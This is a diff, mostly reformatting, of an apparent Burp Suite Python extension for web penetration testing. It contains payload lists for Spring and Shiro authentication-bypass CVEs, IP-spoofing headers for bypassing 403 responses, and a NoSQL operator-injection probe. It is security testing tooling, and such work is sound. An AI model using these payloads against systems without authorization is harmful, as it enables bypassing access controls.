@@ -1,18 +1,19 @@
 import copy
 import json
 
-
 pool = RequestPool(20)
 canary = getOOBCanary()
 print(canary)
 
 
 def handleInteraction(interaction):
-    print(interaction.clientIp().toString() + ":" + str(interaction.clientPort()) + "\t" + interaction.dnsDetails().get().query().toString())
+    print(interaction.clientIp().toString() + ":" + str(
+        interaction.clientPort()) + "\t" + interaction.dnsDetails().get().query().toString())
 
 
 @run_in_thread
 def send_with_proxy(request):
+    #   add `-Dsun.net.http.allowRestrictedHeaders=true` to Burp's vmoptions.txt
     sendWithProxy(request, "127.0.0.1", 8080)
 
 
@@ -26,7 +27,8 @@ def json_dumps(selectedText):
 
 def bypass403(messageEditor):
     request = messageEditor.requestResponse().request()
-    xheaders = ["X-Forwarded-For", "X-Originating-IP", "X-Remote-Addr", "X-Remote-IP", "X-Remote-Addr", "X-Real-IP", "X-Forwarded-Host", "X-Client-IP", "X-Host"]
+    xheaders = ["X-Forwarded-For", "X-Originating-IP", "X-Remote-Addr", "X-Remote-IP", "X-Remote-Addr", "X-Real-IP",
+                "X-Forwarded-Host", "X-Client-IP", "X-Host"]
     for header in xheaders:
         request = request.withHeader(header, "127.0.0.1")
     messageEditor.setRequest(request)
@@ -34,10 +36,12 @@ def bypass403(messageEditor):
 
 def removeBoringHeaders(editor):
     request = editor.requestResponse().request()
-    boring_headers = ["Sec-Ch-Ua", "Sec-Ch-Ua-Mobile", "Sec-Ch-Ua-Platform", "Sec-Fetch-Site", "Sec-Fetch-Mode", "Sec-Fetch-Dest", "Priority"]
+    boring_headers = ["Sec-Ch-Ua", "Sec-Ch-Ua-Mobile", "Sec-Ch-Ua-Platform", "Sec-Fetch-Site", "Sec-Fetch-Mode",
+                      "Sec-Fetch-Dest", "Priority"]
     for header in boring_headers:
         request = request.withRemovedHeader(header)
     editor.setRequest(request)
+
 
 # When performing network I/O or other time-consuming operations, the main thread's user interface (UI) gets blocked
 # until these operations are completed. By delegating time-consuming network I/O operations to threads(@run_in_thread),
@@ -69,7 +73,8 @@ def insert_to_reflect_params(messageEditor):
         return
     body = response.bodyToString()
     for param in request.parameters():
-        if (param.type() == HttpParameterType.BODY or param.type() == HttpParameterType.URL) and (param.value() in body or urldecode(param.value()) in body):
+        if (param.type() == HttpParameterType.BODY or param.type() == HttpParameterType.URL) and (
+                param.value() in body or urldecode(param.value()) in body):
             request = request.withRemovedParameters(param).withParameter(parameter(param.name(), payload, param.type()))
     messageEditor.setRequest(request)
 
@@ -80,11 +85,14 @@ def no_sql_request(request):
     if requestResponse.response() is None:
         return
     body = requestResponse.response().bodyToString()
-    for highlight in ["unknown operator", "MongoError", "83b3j45b", "cannot be applied to a field", "expression is invalid"]:
+    for highlight in ["unknown operator", "MongoError", "83b3j45b", "cannot be applied to a field",
+                      "expression is invalid"]:
         if highlight in body:
-            addIssue(auditIssue("NoSQL Injection", "String detail", "String remediation", requestResponse.request().url(),
-                                AuditIssueSeverity.HIGH, AuditIssueConfidence.CERTAIN, "String background",
-                                "String remediationBackground", AuditIssueSeverity.MEDIUM, requestResponse.withResponseMarkers(getResponseHighlights(requestResponse, highlight))))
+            addIssue(
+                auditIssue("NoSQL Injection", "String detail", "String remediation", requestResponse.request().url(),
+                           AuditIssueSeverity.HIGH, AuditIssueConfidence.CERTAIN, "String background",
+                           "String remediationBackground", AuditIssueSeverity.MEDIUM,
+                           requestResponse.withResponseMarkers(getResponseHighlights(requestResponse, highlight))))
             break
 
 
@@ -103,18 +111,19 @@ def noSqliScan(request):
             paramType = param.type()
             if paramType == HttpParameterType.BODY or paramType == HttpParameterType.URL or paramType == HttpParameterType.COOKIE:
                 #            no_sql_request(request.withUpdatedParameters(parameter(param.name() + "[$83b3j45b]", param.value(), paramType)))
-                no_sql_request(request.withRemovedParameters(param).withParameter(parameter(param.name() + "[$83b3j45b]", param.value(), paramType)))
+                no_sql_request(request.withRemovedParameters(param).withParameter(
+                    parameter(param.name() + "[$83b3j45b]", param.value(), paramType)))
 
 
-def middle_bypass_poc(path1 ,path2):
+def middle_bypass_poc(path1, path2):
     middles = ["/;/",  # https://evilpan.com/2023/08/19/url-gotchas-spring/#bypass-tricks
                "\\",
                "/foo/..;/",
                "//",
                "/foo/.././/",
                "/%20/%20//%20",
-               "%20/", # spring CVE-2016-5007
-               "/%0d", # spring CVE-2016-5007
+               "%20/",  # spring CVE-2016-5007
+               "/%0d",  # spring CVE-2016-5007
                ]
     return_pocs = []
     for middle in middles:
@@ -124,21 +133,21 @@ def middle_bypass_poc(path1 ,path2):
     return_pocs.append(path1 + '/' + '%%%02x' % ord(path2.lstrip('/')[:1]) + path2[1:])
     return_pocs.append(path1 + '/' + path2.lstrip('/')[:1].upper() + path2[1:])
     return_pocs.append(path1 + '/' + path2.lstrip('/')[:1].lower() + path2[1:])
-    return_pocs.append(path1 + '/' + path2.lstrip('/')[:1] + '%0d' + path2[1:]) # shiro cve-2022-32532
+    return_pocs.append(path1 + '/' + path2.lstrip('/')[:1] + '%0d' + path2[1:])  # shiro cve-2022-32532
     return return_pocs
 
 
 def suffix_bypass_poc(path):
     only_suffix_poc = []
-    suffixs = ['/', # shiro cve-2021-41303
-               "/.", # shiro CVE-2020-17510
-               "/%2e", # shiro CVE-2020-17510
-               "/%20", # shiro CVE-2020-17523
-               "%0d%0a", # shiro CVE-2022-22978
+    suffixs = ['/',  # shiro cve-2021-41303
+               "/.",  # shiro CVE-2020-17510
+               "/%2e",  # shiro CVE-2020-17510
+               "/%20",  # shiro CVE-2020-17523
+               "%0d%0a",  # shiro CVE-2022-22978
                '?',
                ';a=b',
                ';.css',
-               '\x09', # https://mp.weixin.qq.com/s/DKVygLtFCmkCs1wycuH70w
+               '\x09',  # https://mp.weixin.qq.com/s/DKVygLtFCmkCs1wycuH70w
                ';',
                #                '\x85',
                #                '\xA0',
@@ -158,12 +167,13 @@ def process_path_list(path, nest_level):
 
     path1, path2 = '', path.lstrip('/')
     pocs.extend(middle_bypass_poc(path1, path2))
-    for i in range(nest_level-1):
-        if i+1 > len(parts):
+    for i in range(nest_level - 1):
+        if i + 1 > len(parts):
             break
-        path1, path2 = '/' + '/'.join(parts[:i+1]), '/'.join(parts[i+1:])
+        path1, path2 = '/' + '/'.join(parts[:i + 1]), '/'.join(parts[i + 1:])
         pocs.extend(middle_bypass_poc(path1, path2))
     return pocs
+
 
 @run_in_thread
 def router_bypass(request, response):
@@ -179,9 +189,10 @@ def router_bypass(request, response):
         response = requestResponse.response()
         new_status_code = response.statusCode()
         new_content_length = len(response.bodyToString())
-        if new_status_code not in [400, 404, 0] and ((origin_status_code != new_status_code and new_status_code == 200) or origin_content_length != new_content_length):
+        if new_status_code not in [400, 404, 0] and ((
+                                                             origin_status_code != new_status_code and new_status_code == 200) or origin_content_length != new_content_length):
             #            print(requestResponse.request().url())
-            addIssue(auditIssue("spring authentication bypass", "String detail", "String remediation",request.url(),
+            addIssue(auditIssue("spring authentication bypass", "String detail", "String remediation", request.url(),
                                 AuditIssueSeverity.HIGH, AuditIssueConfidence.CERTAIN, "String background",
                                 "String remediationBackground", AuditIssueSeverity.MEDIUM, requestResponse))
 
